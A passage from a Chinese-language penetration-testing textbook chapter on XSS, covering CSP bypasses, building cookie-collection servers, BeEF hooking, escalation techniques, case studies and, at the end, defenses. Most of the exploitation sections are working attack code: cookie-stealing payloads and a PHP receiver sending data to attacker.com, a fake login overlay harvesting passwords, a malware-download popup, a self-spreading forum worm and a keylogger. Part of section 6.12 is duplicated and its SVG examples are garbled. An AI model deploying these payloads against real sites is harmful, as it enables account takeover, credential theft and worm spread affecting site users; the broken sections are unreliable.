{{constructor.constructor('alert(1)')()}}
```

**方法6：利用文件上传**
如果可以上传文件（如SVG、HTML）：
```html
<!-- 上传SVG文件 -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**方法7：利用base标签**
如果CSP没有设置base-uri：
```html
<base href="http://attacker.com/">
<script src="/xss.js"></script>
```

**方法8：利用脚本 gadgets**
如果允许加载某些脚本库，可以利用库中的XSS：
```html
<!-- 利用jQuery -->
<script>$(location.hash)</script>

<!-- 利用AngularJS -->
{{constructor.constructor('alert(1)')()}}

<!-- 利用Vue.js -->
{{constructor.constructor('alert(1)')()}}
```

**方法9：利用CSS样式**
如果style-src设置为'unsafe-inline'：
```html
<style>
@expression(alert(1));
</style>
```

**方法10：利用iframe + srcdoc**
```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

**方法11：利用URL跳转**
```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

**方法12：利用nonce预测**
如果nonce是可预测的：
```html
<script nonce="predictable_nonce">alert(1)</script>
```

**方法13：利用CSP报告功能**
如果CSP设置了report-uri，有时可以利用：
```html
<script>
// 触发CSP报告，可能泄露信息
</script>
```

### 6.8.3 CSP绕过实战思路

1. **仔细分析CSP规则**：找出所有允许的来源和指令
2. **寻找可利用的域名**：在允许的域名中寻找可以控制的内容
3. **寻找JSONP接口**：同源的JSONP可以用来执行代码
4. **寻找上传功能**：上传HTML/SVG等文件
5. **利用前端框架**：AngularJS、Vue.js等框架的模板注入
6. **利用浏览器特性**：如srcdoc、data URI等
7. **尝试各种组合**：不同的绕过方法组合使用

## 6.9 XSS利用平台搭建

### 6.9.1 为什么需要XSS利用平台

手动编写XSS利用代码效率低下，而且功能有限。使用XSS利用平台可以：
1. 集中管理被攻陷的浏览器
2. 提供丰富的利用模块
3. 自动化执行攻击
4. 收集和整理数据
5. 方便团队协作

### 6.9.2 自建简单Cookie接收平台

**最简单的PHP接收端**
```php
<?php
// steal.php
$cookie = $_GET['cookie'];
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'];

$log = "[$time] IP: $ip\n";
$log .= "User-Agent: $user_agent\n";
$log .= "Referer: $referer\n";
$log .= "Cookie: $cookie\n";
$log .= str_repeat("-", 50) . "\n";

file_put_contents('cookies.txt', $log, FILE_APPEND);

// 返回1x1像素图片
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
?>
```

**XSS Payload**
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie);
</script>
```

**保存到文件的版本**
```php
<?php
// save.php
$data = $_GET['data'];
$type = $_GET['type'];
$time = date('Y-m-d_H-i-s');
$ip = $_SERVER['REMOTE_ADDR'];
$filename = "data/{$type}_{$ip}_{$time}.txt";
file_put_contents($filename, $data);
?>
```

### 6.9.3 XSS Platform搭建

XSS Platform是一个功能完善的XSS利用平台。

**搭建步骤**
1. 下载XSS Platform源码
2. 配置PHP环境和MySQL数据库
3. 导入数据库文件
4. 修改配置文件
5. 配置域名和SSL证书
6. 部署上线

**使用方法**
```javascript
<script src="http://xssplatform.com/XSS.js"></script>
```

**功能模块**
1. Cookie窃取
2. 页面内容获取
3. 键盘记录
4. 表单劫持
5. 钓鱼攻击
6. 浏览器信息收集
7. 内网扫描

### 6.9.4 高级利用平台架构设计

如果你需要自己搭建一个功能完善的XSS利用平台，可以考虑以下架构：

**后端**
- Python/Node.js/PHP
- 数据库：MySQL/MongoDB
- Web框架：Flask/Django/Express

**前端**
- 管理后台：Vue/React
- 受害者端：纯JavaScript

**功能模块**
1. **会话管理**：管理被攻陷的浏览器
2. **命令控制**：发送命令给受害者浏览器
3. **数据收集**：Cookie、页面内容、键盘记录等
4. **攻击模块**：钓鱼、内网扫描、漏洞利用等
5. **文件管理**：上传下载文件

## 6.10 BeEF框架详解

### 6.10.1 BeEF简介

BeEF（Browser Exploitation Framework）是一个专业的浏览器渗透测试框架，专注于利用浏览器漏洞进行攻击。

**BeEF的特点**
1. 功能强大，模块丰富
2. 支持多种浏览器
3. 跨平台
4. 活跃的社区支持
5. 集成了很多浏览器漏洞利用

### 6.10.2 BeEF安装

**Kali Linux自带BeEF**
```bash
# 启动BeEF
beef-xss

# 或者
cd /usr/share/beef-xss
./beef
```

**源码安装**
```bash
# 克隆代码
git clone https://github.com/beefproject/beef.git
cd beef

# 安装依赖
./install

# 启动BeEF
./beef
```

**Docker安装**
```bash
docker pull janes/beef
docker run -p 3000:3000 janes/beef
```

### 6.10.3 BeEF配置

**配置文件**
```yaml
# main/config.yaml

# 监听地址和端口
beef:
    http:
        host: "0.0.0.0"
        port: "3000"
    
    # 管理员账号
    credentials:
        user: "beef"
        pass: "beef"
    
    # 网页挂马代码
    hook_file: "/hook.js"
```

**修改默认密码**
首次使用后务必修改默认密码，避免被他人利用。

### 6.10.4 BeEF使用

**Hook脚本**
```javascript
<script src="http://beefserver:3000/hook.js"></script>
```

**管理界面**
```
http://beefserver:3000/ui/panel
```

**主要功能模块**

&#124; 模块类别 &#124; 说明 &#124;
&#124;---------&#124;------&#124;
&#124; 浏览器信息 &#124; 收集浏览器、操作系统信息 &#124;
&#124; Cookie窃取 &#124; 获取用户Cookie &#124;
&#124; 会话劫持 &#124; 接管用户会话 &#124;
&#124; 网络探测 &#124; 扫描内网、端口扫描 &#124;
&#124; 社会工程 &#124; 钓鱼、弹窗欺骗 &#124;
&#124; 浏览器利用 &#124; 浏览器漏洞利用 &#124;
&#124; 持久化 &#124; 持久化控制 &#124;
&#124; 插件检测 &#124; 检测浏览器插件漏洞 &#124;

**常用模块使用**
1. **Get Cookie**：获取用户Cookie
2. **Get Page HTML**：获取当前页面HTML
3. **Key Logger**：键盘记录
4. **Redirect Browser**：页面跳转
5. **Internal Network Scan**：内网扫描
6. **Fake Flash Update**：伪造Flash更新钓鱼
7. **Alert Dialog**：弹出对话框

### 6.10.5 BeEF实战技巧

**技巧1：隐蔽Hook**
```javascript
// 使用图片加载隐藏hook
var img = new Image();
img.onerror = function() {
    var script = document.createElement('script');
    script.src = 'http://beefserver:3000/hook.js';
    document.body.appendChild(script);
};
img.src = 'invalid_url';
```

**技巧2：持久化**
利用XSS将hook代码注入到localStorage或sessionStorage中，实现一定程度的持久化。

**技巧3：内网渗透**
利用受害者浏览器作为跳板，扫描内网、攻击内网设备。

## 6.11 XSS危害升级技巧

### 6.11.1 从普通XSS到高危漏洞

一个普通的XSS漏洞可能被评为中危，但通过以下技巧可以升级为高危：

1. **窃取管理员Cookie**：如果能获取管理员Cookie，可能接管后台
2. **CSRF组合拳**：结合CSRF执行敏感操作
3. **钓鱼攻击**：伪造登录页面获取账号密码
4. **内网渗透**：利用浏览器扫描内网
5. **浏览器漏洞利用**：结合浏览器漏洞获取系统权限
6. **XSS蠕虫**：自动传播，影响范围大

### 6.11.2 Cookie窃取进阶

**HttpOnly Cookie绕过**
虽然HttpOnly的Cookie不能通过JavaScript直接读取，但可以通过以下方法间接获取：

1. **利用Flash**：Flash跨域读取Cookie（旧版Flash）
2. **利用Java Applet**：Java Applet跨域（已废弃）
3. **利用TRACE方法**：HTTP TRACE方法回显Cookie
4. **利用其他漏洞**：结合XST（Cross-Site Tracing）
5. **利用中间人攻击**：HTTPS降级

**Cookie路径绕过**
如果Cookie设置了path限制，可以尝试：
1. 找到该路径下的页面
2. 利用iframe嵌套该路径的页面
3. 利用该路径下的XSS

### 6.11.3 XSS钓鱼攻击

**伪造登录页面**
```javascript
<script>
function phishing() {
    // 清空页面
    document.body.innerHTML = '';
    
    // 创建伪造的登录框
    var loginBox = document.createElement('div');
    loginBox.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        padding: 40px;
        background: #fff;
        border: 1px solid #ccc;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
        z-index: 9999;
    `;
    
    loginBox.innerHTML = `
        <h2>登录超时，请重新登录</h2>
        <form action="http://attacker.com/steal_password" method="POST">
            <p><input type="text" name="username" placeholder="用户名" style="width:200px;padding:8px;margin:5px 0;"></p>
            <p><input type="password" name="password" placeholder="密码" style="width:200px;padding:8px;margin:5px 0;"></p>
            <p><input type="submit" value="登录" style="width:216px;padding:10px;background:#428bca;color:#fff;border:none;cursor:pointer;"></p>
        </form>
    `;
    
    document.body.appendChild(loginBox);
    
    // 模糊背景
    document.body.style.filter = 'blur(5px)';
}

window.onload = phishing;
</script>
```

**仿冒官方弹窗**
```javascript
<script>
// 伪造系统更新提示
var popup = document.createElement('div');
popup.style.cssText = 'position:fixed;top:10px;right:10px;padding:15px;background:#fff;border:1px solid #ccc;z-index:9999;';
popup.innerHTML = `
    <p>检测到重要安全更新，请点击安装：</p>
    <button onclick="window.location.href='http://attacker.com/malware.exe'">立即安装</button>
`;
document.body.appendChild(popup);
</script>
```

### 6.11.4 XSS蠕虫

**XSS蠕虫的原理**
XSS蠕虫利用存储型XSS，自动将恶意脚本传播到其他页面或用户，形成蠕虫式传播。

**论坛XSS蠕虫示例**
```javascript
<script>
// XSS Worm
(function() {
    // 1. 窃取Cookie
    var cookie = document.cookie;
    
    // 2. 获取CSRF Token
    var csrf = document.querySelector('meta[name="csrf-token"]').content;
    
    // 3. 自动发帖/评论传播XSS
    function spreadXSS() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/forum/post', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.setRequestHeader('X-CSRF-Token', csrf);
        
        // 蠕虫代码（这里简化了，实际应该包含完整的蠕虫脚本）
        var wormCode = '<script src="http://attacker.com/worm.js"></scr' + 'ipt>';
        
        xhr.send('title=分享一个有趣的东西&content=' + encodeURIComponent(wormCode));
    }
    
    // 4. 发送Cookie到攻击者服务器
    var img = new Image();
    img.src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(cookie);
    
    // 5. 延迟传播，避免被发现
    setTimeout(spreadXSS, 5000);
})();
</script>
```

**XSS蠕虫的危害**
1. 传播速度快，影响范围广
2. 难以彻底清除
3. 可能造成网站瘫痪
4. 可能被用于DDoS攻击
5. 可能窃取大量用户信息

**著名的XSS蠕虫**
1. **Samy蠕虫**：2005年MySpace上的XSS蠕虫，20小时内感染了100多万用户
2. **Yamanner蠕虫**：2006年Yahoo Mail的XSS蠕虫
3. **Twitter蠕虫**：多次出现的Twitter XSS蠕虫

### 6.11.5 键盘记录

**基础版键盘记录**
```javascript
<script>
var keylog = '';

document.onkeypress = function(e) {
    keylog += e.key;
    
    // 每输入50个字符发送一次
    if (keylog.length > 50) {
        sendLog();
        keylog = '';
    }
};

function sendLog() {
    var img = new Image();
    img.src = 'http://attacker.com/keylog?data=' + encodeURIComponent(keylog);
}

// 页面关闭时发送剩余记录
window.onbeforeunload = function() {
    if (keylog.length > 0) {
        sendLog();
    }
};
</script>
```

**高级版键盘记录**
- 记录按键时间
- 记录鼠标点击
- 记录表单输入
- 记录剪切板内容
- 记录页面滚动

## 6.12 不同场景下的XSS挖掘

### 6.12.1 富文本编辑器XSS

富文本编辑器是XSS的高发区，因为它允许用户输入HTML。

**常见的富文本编辑器**
- UEditor
- KindEditor
- CKEditor
- TinyMCE
- wangEditor
- Quill

**测试方法**
1. 测试各种HTML标签
2. 测试各种事件属性
3. 测试各种伪协议
4. 测试SVG、MathML等
5. 测试CSS样式注入

**常用测试Payload**
```html
<!-- 基础测试 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 属性测试 -->
<a href="javascript:alert(1)">test</a>
<iframe src="javascript:alert(1)"></iframe>
<form action="javascript:alert(1)"><input type=submit></form>

<!-- CSS测试 -->
<style>@import 'javascript:alert(1)'</style>
<div style="expression(alert(1))">test</div>

<!-- SVG高级技巧 -->
<svg><script>alert(1)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">

<a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a>


<svg xmlns="http://www.w3.org/2000/svg">

<a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a>
</svg>

<!-- MathML -->
<math href="javascript:alert(1)">
<mi>x</mi>
</math>
```

### 6.12.2 文件上传中的XSS

文件上传功能也可能导致XSS：

**文件名XSS**
```
文件名：<script>alert(1)</script>.jpg
```

**文件内容XSS**
- SVG文件：SVG中可以嵌入脚本
- HTML文件：直接上传HTML
- CSV文件：公式注入（类似XSS）
- XML文件：XXE或XSS
- PDF文件：PDF中的JavaScript

**SVG XSS示例**
```xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">

    <script type="text/javascript">
        alert(document.cookie);
    </script>


<!-- MathML -->
<math href="javascript:alert(1)">
<mi>x</mi>
</math>
```

### 6.12.2 文件上传中的XSS

文件上传功能也可能导致XSS：

**文件名XSS**
```
文件名：<script>alert(1)</script>.jpg
```

**文件内容XSS**
- SVG文件：SVG中可以嵌入脚本
- HTML文件：直接上传HTML
- CSV文件：公式注入（类似XSS）
- XML文件：XXE或XSS
- PDF文件：PDF中的JavaScript

**SVG XSS示例**
```xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">

    <script type="text/javascript">
        alert(document.cookie);
    </script>
</svg>
```

### 6.12.3 搜索框XSS

搜索功能是反射型XSS的高发区：

**测试方法**
1. 输入特殊字符，观察是否被过滤
2. 观察输出位置
3. 根据输出位置构造payload

**常见场景**
- 搜索结果页面显示搜索关键词
- 搜索框中回显搜索词
- 搜索历史记录

### 6.12.4 错误页面XSS

错误页面（如404页面）也可能存在XSS：

**测试方法**
访问不存在的页面，URL中包含XSS payload：
```
http://example.com/<script>alert(1)</script>
http://example.com/page?<script>alert(1)</script>=1
```

如果404页面显示了URL或参数，就可能存在XSS。

## 6.13 Self-XSS与Universal XSS

### 6.13.1 Self-XSS

**什么是Self-XSS**
Self-XSS是指用户只能在自己的浏览器中触发的XSS，需要用户交互才能触发。

**常见场景**
- 需要用户粘贴恶意代码到控制台
- 需要用户修改某个参数
- 需要用户执行特定操作

**Self-XSS的利用**
虽然Self-XSS需要用户交互，但结合社会工程学仍然可以利用：
1. 诱骗用户在控制台执行代码
2. 诱骗用户修改URL参数
3. 诱骗用户点击书签

**Self-XSS的评级**
一般来说，Self-XSS的危害较低，通常评为低危或中低危。但如果能结合其他漏洞，可能升级。

### 6.13.2 Universal XSS（UXSS）

**什么是Universal XSS**
Universal XSS是浏览器级别的XSS漏洞，利用浏览器或浏览器扩展的漏洞，在任意网站上执行脚本。

**UXSS的原理**
1. 浏览器漏洞
2. 浏览器扩展漏洞
3. 同源策略绕过
4. 协议处理漏洞

**著名的UXSS漏洞**
1. **IE的UXSS**：早期IE浏览器的多个UXSS漏洞
2. **Chrome扩展UXSS**：很多Chrome扩展存在XSS漏洞
3. **PDF阅读器UXSS**：PDF阅读器插件的XSS
4. **Flash UXSS**：Flash的跨域漏洞

**UXSS的危害**
UXSS的危害极大，因为它可以：
1. 攻击任意网站
2. 窃取任意网站的Cookie
3. 控制用户的整个浏览器
4. 完全绕过同源策略

## 6.14 XSS实战案例

### 6.14.1 案例1：论坛存储型XSS

**场景描述**
某论坛的帖子内容存在存储型XSS漏洞。

**漏洞发现过程**
1. 注册账号，进入论坛
2. 尝试发帖，在帖子内容中输入各种XSS payload
3. 发现基本的<script>被过滤
4. 尝试<img src=x onerror=alert(1)>
5. 发帖成功，访问帖子弹出alert框

**漏洞详情**
```
# 发帖测试
标题：测试帖子
内容：<img src=x onerror=alert(1)>

# 结果
帖子发布成功，访问帖子弹出alert框
```

**漏洞利用**
```javascript
// 窃取Cookie
<script>
var img = new Image();
img.src = "http://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
</script>

// 传播蠕虫
<script>
// 自动回复帖子，传播XSS
var xhr = new XMLHttpRequest();
xhr.open("POST", "/forum/reply", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;

var wormCode = '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'http://attacker.com/worm.js\';document.body.appendChild(s);">';

xhr.send("tid=123&content=" + encodeURIComponent(wormCode));
</script>
```

**报告要点**
- 漏洞类型：存储型XSS
- 严重程度：高危
- 影响：所有访问帖子的用户
- 修复建议：对帖子内容进行HTML编码或使用白名单过滤

### 6.14.2 案例2：搜索反射型XSS

**场景描述**
某电商网站搜索功能存在反射型XSS漏洞。

**漏洞发现过程**
1. 打开搜索页面，输入关键词搜索
2. 在搜索框中输入"><img src=x onerror=alert(1)>
3. 搜索结果页面弹出alert框
4. 确认存在反射型XSS

**漏洞详情**
```
# 搜索测试
?q=<script>alert(1)</script>

# 结果
搜索结果显示<script>alert(1)</script>，弹出alert框
```

**漏洞利用**
```
# 构造恶意链接
http://example.com/search?q=<script>var img=new Image();img.src="http://attacker.com/steal?c="+encodeURIComponent(document.cookie)</script>

# 诱骗用户点击
通过邮件、社交媒体、短信等方式传播链接
```

**升级危害**
1. 构造钓鱼链接，窃取用户账号密码
2. 伪造登录页面
3. 诱导用户下载恶意软件

### 6.14.3 案例3：用户资料DOM型XSS

**场景描述**
某社交网站用户资料页面存在DOM型XSS漏洞。

**漏洞发现过程**
1. 分析页面JavaScript代码
2. 发现页面使用location.hash设置用户昵称
3. 代码中使用innerHTML输出
4. 构造payload测试

**漏洞详情**
```javascript
// 页面代码
<script>
var nickname = location.hash.substring(1);
document.getElementById('nickname').innerHTML = nickname;
</script>
```

**测试**
```
http://example.com/profile#<img src=x onerror=alert(1)>
```

**漏洞利用**
```javascript
http://example.com/profile#<script>var img=new Image();img.src="http://attacker.com/steal?c="+encodeURIComponent(document.cookie)</script>
```

### 6.14.4 案例4：富文本编辑器XSS

**场景描述**
某博客系统使用富文本编辑器，存在XSS漏洞。

**漏洞发现过程**
1. 打开编辑器，测试各种HTML标签
2. <script>标签被过滤
3. <img>标签被允许
4. 测试img的onerror事件，被过滤
5. 尝试大小写混合：<IMG SRC=X ONERROR=alert(1)>
6. 成功触发XSS

**绕过过程**
```
# 测试1：基础测试
<script>alert(1)</script>
# 失败，script被过滤

# 测试2：事件测试
<img src=x onerror=alert(1)>
# 失败，onerror被过滤

# 测试3：大小写绕过
<IMG SRC=X ONERROR=alert(1)>
# 成功！因为过滤只匹配小写的onerror
```

**漏洞利用**
```html
<IMG SRC=X ONERROR="var s=document.createElement('script');s.src='http://attacker.com/xss.js';document.body.appendChild(s);">
```

### 6.14.5 案例5：文件名XSS

**场景描述**
某文件管理系统上传文件时，文件名回显存在存储型XSS。

**漏洞发现过程**
1. 上传文件功能
2. 上传后页面显示文件名
3. 修改文件名包含XSS payload
4. 上传后触发XSS

**漏洞详情**
```
# 上传文件
文件名：<img src=x onerror=alert(1)>.jpg

# 上传成功
文件列表页面显示文件名，触发XSS
```

**漏洞利用**
1. 上传恶意文件名的文件
2. 管理员查看文件列表时触发XSS
3. 窃取管理员Cookie
4. 接管管理员账号

### 6.14.6 案例6：SRC平台真实案例 - 某知名电商XSS

**背景故事**
这是一个发生在某知名电商平台的真实XSS案例。白帽子小明在测试该电商的商品评价功能时发现了一个存储型XSS漏洞。

**发现过程**
1. 小明在商品评价中输入各种XSS payload
2. 发现普通的<script>被过滤
3. 测试img标签的事件属性，也被过滤
4. 尝试SVG标签，发现SVG标签被允许
5. 构造<svg onload=alert(1)>，成功触发XSS

**升级危害**
1. 这个XSS是存储型的，所有查看商品评价的用户都会被攻击
2. 小明构造了一个窃取Cookie的payload
3. 发现管理员Cookie有HttpOnly，无法直接窃取
4. 但小明发现可以利用这个XSS构造CSRF攻击
5. 最终可以以任意用户的身份执行操作

**报告提交**
小明详细记录了漏洞的复现步骤和危害，提交给了电商SRC。由于危害较大（存储型、影响所有用户、可执行操作），该漏洞被评为高危，小明获得了丰厚的奖金。

**修复方案**
1. 对用户输入进行HTML实体编码
2. 使用白名单过滤HTML标签和属性
3. 对SVG等特殊标签做特殊处理
4. 添加CSP防护

## 6.15 XSS防护

### 6.15.1 输入过滤

**过滤危险字符**
```php
function filterXSS($str) {
    $str = str_replace('<', '&lt;', $str);
    $str = str_replace('>', '&gt;', $str);
    $str = str_replace('"', '&quot;', $str);
    $str = str_replace("'", '&#39;', $str);
    return $str;
}
```

注意：简单的字符串替换容易被绕过，不建议作为唯一的防护手段。

**使用白名单**
```php
// 只允许安全标签
$allowed_tags = '<p><br><strong><em><ul><ol><li>';
$content = strip_tags($content, $allowed_tags);
```

**使用专业的XSS过滤库**
- PHP：HTMLPurifier
- Java：OWASP Java HTML Sanitizer
- Python：Bleach
- JavaScript：DOMPurify

**HTMLPurifier使用示例**
```php
require_once '/path/to/HTMLPurifier.auto.php';

$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean_html = $purifier->purify($dirty_html);
```

### 6.15.2 输出编码

**HTML编码**
```php
echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
```

**JavaScript编码**
```javascript
// 使用textContent而非innerHTML
element.textContent = name;

// 或使用编码函数
function encodeJS(str) {
    return str.replace(/[\s\S]/g, function(c) {
        return '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4);
    });
}
```

**URL编码**
```php
echo urlencode($url);
```

**CSS编码**
```php
// 使用json_encode对CSS值编码
echo json_encode($color);
```

**不同上下文的编码方式**

| 输出位置 | 编码方式 | 示例 |
|---------|---------|------|
| HTML内容 | HTML实体编码 | htmlspecialchars() |
| HTML属性 | HTML实体编码 | htmlspecialchars() |
| JavaScript | JavaScript编码 | JSON.stringify() |
| CSS | CSS十六进制编码 | \XX 或 \XXXX |
| URL | URL编码 | urlencode() |

### 6.15.3 CSP防护

Content Security Policy（CSP）可以限制资源加载来源：

```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    connect-src 'self';
    font-src 'self';
    frame-src 'none';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
">
```

**CSP指令说明**

| 指令 | 说明 |
|-----|------|
| default-src | 默认资源来源 |
| script-src | JavaScript来源 |
| style-src | CSS来源 |
| img-src | 图片来源 |
| connect-src | 连接来源（XHR、WebSocket） |
| font-src | 字体来源 |
| frame-src | iframe来源 |
| object-src | 对象来源 |
| base-uri | base标签来源 |
| form-action | 表单提交目标 |
| report-uri | CSP违规报告地址 |

**CSP最佳实践**
1. 禁用inline脚本（去掉'unsafe-inline'）
2. 禁用eval（去掉'unsafe-eval'）
3. 限制脚本来源
4. 禁用object-src
5. 启用report-uri监控违规
6. 先使用report-only模式测试

### 6.15.4 Cookie防护

**设置HttpOnly**
```php
setcookie('session', $value, time()+3600, '/', '', true, true);
// 最后一个参数为HttpOnly
```

**设置Secure**
```php
setcookie('session', $value, time()+3600, '/', '', true, true);
// 第6个参数为Secure，只在HTTPS传输
```

**设置SameSite**
```php
// PHP 7.3+支持
setcookie('session', $value, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict' // 或 Lax
]);
```

### 6.15.5 其他防护措施

1. **X-XSS-Protection头**
```php
header("X-XSS-Protection: 1; mode=block");
```

2. **输入验证**
- 验证数据格式
- 验证数据长度
- 验证数据范围
- 白名单验证

3. **定期审计**
- 代码审计
- 安全测试
- 漏洞扫描

4. **安全编码培训**
- 开发人员安全培训
- 代码规范制定
- Code Review

## 6.16 本章小结

本章详细介绍了XSS跨站脚本漏洞的各个方面，包括XSS类型、原理、检测方法、Payload构造、利用技巧、绕过技巧和实战案例。

**关键要点回顾**

1. XSS分为反射型、存储型、DOM型三种主要类型
2. 反射型XSS需要诱骗用户点击恶意链接
3. 存储型XSS危害最大，影响所有访问用户
4. DOM型XSS不经过服务器，难以检测
5. XSS Payload可以窃取Cookie、钓鱼、键盘记录等
6. 绕过WAF有30+种方法，包括编码、变形、特殊标签等
7. CSP可以有效防护XSS，但也有10+种绕过方法
8. BeEF是功能强大的XSS利用框架
9. XSS蠕虫可以自动传播，危害极大
10. 防护措施包括输入过滤、输出编码、CSP、HttpOnly等

**下一章预告**

下一章我们将学习文件上传与包含漏洞，包括漏洞原理、检测方法、利用技巧和实战案例。

---

**思考题**

1. 反射型XSS和存储型XSS有什么区别？
2. DOM型XSS为什么难以检测？
3. 如何构造绕过过滤的XSS Payload？
4. CSP如何防止XSS攻击？有哪些绕过方法？
5. HttpOnly Cookie有什么作用？
6. XSS绕过WAF有哪些常用方法？
7. 什么是XSS蠕虫？它的危害是什么？
8. BeEF框架有什么功能？
9. 富文本编辑器的XSS如何检测和防护？
10. XSS的防护措施有哪些？
